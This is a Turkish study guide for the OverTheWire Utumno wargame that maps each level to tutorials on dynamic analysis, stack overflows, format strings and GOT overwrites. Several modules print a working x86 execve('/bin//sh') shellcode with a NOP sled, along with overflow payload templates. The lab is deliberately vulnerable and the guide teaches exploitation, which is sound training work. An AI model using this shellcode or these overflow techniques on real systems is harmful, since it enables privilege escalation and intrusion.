# 📚 Utumno — Konu Anlatımları Dizini

> Her seviye için hangi konu anlatımlarını okuman gerektiğini listeler.  
> Önce konu anlatımını oku, sonra seviyeyi çözmeye çalış.

---

## Utumno Hakkında

**Zorluk:** 4/10 — Leviathan ve Behemoth'tan daha zor.  
**Platform:** Linux/x86 (32-bit), SUID binary'ler  
**Bağlantı:** `ssh utumno0@utumno.labs.overthewire.org -p 2227`  
**Şifre dosyaları:** `/etc/utumno_pass/`

---

## 🗺️ Level → Konu Eşlemesi

| Level | Ana Zafiyet | Oku |
|---|---|---|
| 0 → 1 | `strace`/`ltrace`, SUID, `open()` analizi | [Modül 1: Dinamik Analiz] |
| 1 → 2 | `strings`, env var, argv okuma | [Modül 2: Statik Analiz & Girdi Kanalları] |
| 2 → 3 | Stack buffer overflow + shellcode | [Modül 3: BOF + Shellcode] |
| 3 → 4 | Pointer manipülasyonu | [Modül 4: Pointer Manipülasyonu] ← Yeni |
| 4 → 5 | Argv BOF + sembolik link | [Modül 5: Argv BOF & Symlink] |
| 5 → 6 | Format string — stack okuma | [Modül 6: Format String Okuma] |
| 6 → 7 | Format string — GOT overwrite | [Modül 7: GOT/PLT & Arbitrary Write] ← Yeni |
| 7 → 8 | BOF + environment shellcode | [Modül 8: Env Shellcode BOF] |
| 8 → 9 | Argv BOF (daha derin) | [Modül 9: Gelişmiş Argv BOF] |
| 9 → son | Kombine teknikler | Tüm modüller |

---

## 📖 Modül 1 — Dinamik Analiz: `ltrace` / `strace` / `open()`

**İlgili level:** Utumno0  
**Ne öğreniyorsun:** Kaynak kodu olmadan binary'nin ne yaptığını çalışma zamanında izlemek.

### Oku:
- `konu_anlatimlari/leviathan_komutlari/ltrace_strace.md`
- `konu_anlatimlari/behemoth/modul1_dinamik_analiz.md`

### Özet:

```bash
# Kütüphane çağrılarını izle (strcmp, fopen, open...)
ltrace /utumno/utumno0

# Sistem çağrılarını izle (open, read, write, execve...)
strace /utumno/utumno0 2>&1

# Sadece open çağrılarına bak
strace /utumno/utumno0 2>&1 | grep "^open"

# SUID binary mi?
ls -la /utumno/utumno0
```

**Anahtar kavram:** `open(path, O_RDONLY)` — binary hangi dosyayı açıyor? O dosyayı biz de okuyabilir miyiz?

---

## 📖 Modül 2 — Statik Analiz ve Girdi Kanalları

**İlgili level:** Utumno1  
**Ne öğreniyorsun:** Binary içindeki gizli stringleri bulmak; argv ve environment variable üzerinden girdi vermek.

### Oku:
- `konu_anlatimlari/leviathan_komutlari/binary_analizi.md`
- `konu_anlatimlari/binary_exploitation/00b_gdb_ile_assembly_okumak.md`

### Özet:

```bash
# Binary içindeki düz metinleri gör
strings /utumno/utumno1

# Hangi env var'ı okuyor?
ltrace /utumno/utumno1   # getenv() çağrısı
export VAR="deger"
/utumno/utumno1

# Argüman bekliyor mu?
/utumno/utumno1 test_arguman

# GDB ile hangi karşılaştırma yapıyor?
gdb /utumno/utumno1
(gdb) disas main
# strcmp, memcmp, getenv, atoi... gibi çağrılara bak
```

**Anahtar kavram:** Binary bir şeyi kontrol ediyorsa (`strcmp`, `getenv`, `atoi`), `ltrace` doğrudan değeri gösterir.

---

## 📖 Modül 3 — Stack Buffer Overflow + Shellcode

**İlgili level:** Utumno2  
**Ne öğreniyorsun:** Güvensiz fonksiyonlarla stack overflow yapıp shellcode enjekte etmek.

### Oku:
- `konu_anlatimlari/binary_exploitation/01_bellek_ve_memory_layout.md`
- `konu_anlatimlari/binary_exploitation/03_eip_register_kontrolu.md`
- `konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md`
- `konu_anlatimlari/binary_exploitation/02_little_endian.md`

### Özet:

```bash
# 1. Güvensiz fonksiyon var mı?
ltrace /utumno/utumno2        # gets(), strcpy(), sprintf() gör

# 2. Crash'i yeniden üret
/utumno/utumno2 <<< $(python3 -c "print('A'*200)")

# 3. GDB ile offset bul
gdb /utumno/utumno2
(gdb) run <<< $(python3 -c "print('A'*50 + 'BBBB')")
(gdb) info registers eip
# EIP = 0x42424242 ise offset = 50

# 4. Shellcode + NOP sled ile exploit
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*300 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")
```

**Anahtar kavram:** `gets()` hiçbir zaman güvenli değildir. `sub esp, 0xNN` assembly satırı buffer boyutunu söyler.

---

## 📖 Modül 4 — Pointer Manipülasyonu

**İlgili level:** Utumno3  
**Ne öğreniyorsun:** Assembly'de pointer okumak; fonksiyon pointer'ını shellcode adresine yönlendirmek.

### Oku:
- `konu_anlatimlari/utumno/08_pointer_manipulation.md` ← Bu dosya
- `konu_anlatimlari/binary_exploitation/00_x86_assembly_temelleri.md`
- `konu_anlatimlari/binary_exploitation/06_return_to_libc_ve_fonksiyon_pointer.md`

### Özet:

```bash
# Assembly'de pointer kalıpları
# mov eax, [ecx]   → eax = *ecx (dereference)
# call eax         → (*fp)() (fonksiyon pointer çağrısı)

# GDB ile stack'teki pointer'ları bul
gdb /utumno/utumno3
(gdb) disas main
# "call eax" veya "call [eax+offset]" ara
(gdb) break main && run
(gdb) x/30wx $ebp-0x30    # yerel değişkenler
```

**Anahtar kavram:** `call eax` gördüğünde → o EAX'ı kontrol edebiliyor musun?

---

## 📖 Modül 5 — Argv BOF & Sembolik Link

**İlgili level:** Utumno4  
**Ne öğreniyorsun:** Komut satırı argümanı üzerinden overflow; symlink ile dosya yönlendirme.

### Oku:
- `konu_anlatimlari/behemoth/modul7_argv_bof.md`
- `konu_anlatimlari/binary_exploitation/07_sembolik_link.md`
- `konu_anlatimlari/leviathan_komutlari/sembolik_linkler.md`

### Özet:

```bash
# Argv BOF testi
/utumno/utumno4 $(python3 -c "print('A'*200)")
# Segfault → overflow var

# Symlink senaryosu
ln -sf /etc/utumno_pass/utumno5 /tmp/hedef
/utumno/utumno4 /tmp/hedef    # binary bu dosyayı okuyor mu?
```

**Anahtar kavram:** `strcpy(buf, argv[1])` — argv boyutu kontrol edilmiyor. Birden fazla zafiyet aynı anda kullanılabilir.

---

## 📖 Modül 6 — Format String: Stack Okuma

**İlgili level:** Utumno5  
**Ne öğreniyorsun:** `printf(input)` açığıyla stack belleğini sızdırmak; offset bulmak.

### Oku:
- `konu_anlatimlari/binary_exploitation/05_format_string.md`
- `konu_anlatimlari/behemoth/modul5_format_string.md`

### Özet:

```bash
# Format string açığı testi
echo "%x %x %x" | /utumno/utumno5
# Sayılar görünürse → açık var

# Stack offset bul
for i in $(seq 1 30); do
  echo -n "[$i]: "
  printf "AAAA%%%d\\\$x\n" $i | /utumno/utumno5
done
# 41414141 görünce o satır bizim offset'imiz
```

**Anahtar kavram:** `printf(buf)` yerine `printf("%s", buf)` yazılmalıydı. Format specifier'lar stack'i okur.

---

## 📖 Modül 7 — Format String: GOT Overwrite

**İlgili level:** Utumno6  
**Ne öğreniyorsun:** `%n` ile belleğe yazmak; GOT tablosunu değiştirerek fonksiyon çağrısını ele geçirmek.

### Oku:
- `konu_anlatimlari/utumno/09_got_plt_overwrite.md` ← Bu dosya
- `konu_anlatimlari/binary_exploitation/05_format_string.md` (özellikle `%n` bölümü)

### Özet:

```bash
# GOT tablosunu gör
objdump -R /utumno/utumno6

# Hedef: exit@GOT veya puts@GOT
# Oraya shellcode adresini yaz
# Binary o fonksiyonu çağırdığında shellcode çalışır

# 2 byte 2 byte yaz
# payload = [got_addr_low][got_addr_high] + %hn + %hn
```

**Anahtar kavram:** GOT dinamik bir tablodur ve yazılabilir bellektedir. `%n` format specifier'ı bellekte doğrudan yazar.

---

## 📖 Modül 8 — Environment Variable + BOF

**İlgili level:** Utumno7  
**Ne öğreniyorsun:** Stack sınırlıyken shellcode'u environment variable'a taşımak; doğru adresi bulmak.

### Oku:
- `konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md` (env var bölümü)
- `konu_anlatimlari/binary_exploitation/03_eip_register_kontrolu.md`

### Özet:

```bash
# Shellcode'u environment'a koy (büyük NOP sled ile)
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*500 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")

# Adresini GDB ile bul
gdb /utumno/utumno7
(gdb) break main
(gdb) run
(gdb) x/s *((char**)environ)    # EGG değişkenini bul
# NOP sled'in ortasına işaret eden adresi al

# EIP'yi o adrese yönlendir
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*<OFFSET> + b'<NOP_addr>')"; cat) | /utumno/utumno7
```

**Anahtar kavram:** Environment variable'lar stack'te tutulur ama bizim buffer'ımızdan daha yüksek bir adreste. NOP sled geniş tutulursa kesin adres bilmek gerekmez.

---

## 📖 Modül 9 — Gelişmiş Argv BOF

**İlgili level:** Utumno8  
**Ne öğreniyorsun:** `argv[1]` üzerinden `strcpy` overflow; alphanumeric veya uzunluk filtresi varsa nasıl aşılır.

### Oku:
- `konu_anlatimlari/behemoth/modul7_argv_bof.md`
- `konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md`

### Özet:

```bash
# Argv overflow testi
gdb /utumno/utumno8
(gdb) run $(python3 -c "print('A'*200)")
(gdb) info registers eip

# Filtre var mı? (ltrace'de isalpha, isalnum gibi çağrılar)
ltrace /utumno/utumno8 2>&1 | grep -E "isalpha|isalnum|strlen|memcmp"

# Filtre varsa → shellcode'u environment'a, payload'u argv'ye
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*300 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")
/utumno/utumno8 $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*<OFFSET> + b'<EGG_addr>')")
```

---

## 🛠️ Genel Metodoloji (Her Level İçin)

```bash
# 1. Keşif
file /utumno/utumnoX
ls -la /utumno/utumnoX          # SUID mi?
strings /utumno/utumnoX         # gizli stringler

# 2. Dinamik analiz
ltrace /utumno/utumnoX          # kütüphane çağrıları
strace /utumno/utumnoX 2>&1     # sistem çağrıları

# 3. Statik analiz
gdb /utumno/utumnoX
(gdb) info functions
(gdb) disas main

# 4. Zafiyet türünü belirle
#    gets/strcpy/sprintf → BOF
#    printf(input)       → Format string
#    call eax            → Pointer manipulation
#    access()+open()     → TOCTOU/symlink

# 5. Exploit
#    Offset bul → shellcode koy → ret addr'yi değiştir → shell al
```

---

## 📚 Tüm Kaynaklar

### Konu Anlatımları
- `konu_anlatimlari/binary_exploitation/` — tüm dosyalar
- `konu_anlatimlari/behemoth/` — dinamik analiz modülleri
- `konu_anlatimlari/leviathan_komutlari/` — ltrace, strace, gdb, symlink
- `konu_anlatimlari/utumno/08_pointer_manipulation.md`
- `konu_anlatimlari/utumno/09_got_plt_overwrite.md`

### Kitap
- Dang, Gazet, Bachaalany — *Practical Reverse Engineering: x86, x64, ARM* (Wiley, 2014)  
  Özellikle: Chapter 1 — x86 and x64

### Araçlar
- [GDB Cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
- [Shell-storm Shellcodes](http://shell-storm.org/shellcode/)
- [Format String Exploits](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
- [pwntools](https://docs.pwntools.com/en/stable/)
